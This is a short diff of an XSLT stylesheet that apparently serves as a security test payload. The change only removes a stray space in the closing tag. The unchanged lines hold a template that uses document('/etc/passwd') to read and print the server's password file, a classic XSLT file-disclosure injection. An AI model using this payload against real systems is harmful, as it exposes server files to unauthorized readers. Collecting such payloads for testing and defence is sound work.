@@ -3,4 +3,4 @@
 <xsl:template match="/">
 <xsl:value-of select="document('/etc/passwd')"/>
 </xsl:template>
-</xsl:stylesheet >
+</xsl:stylesheet>
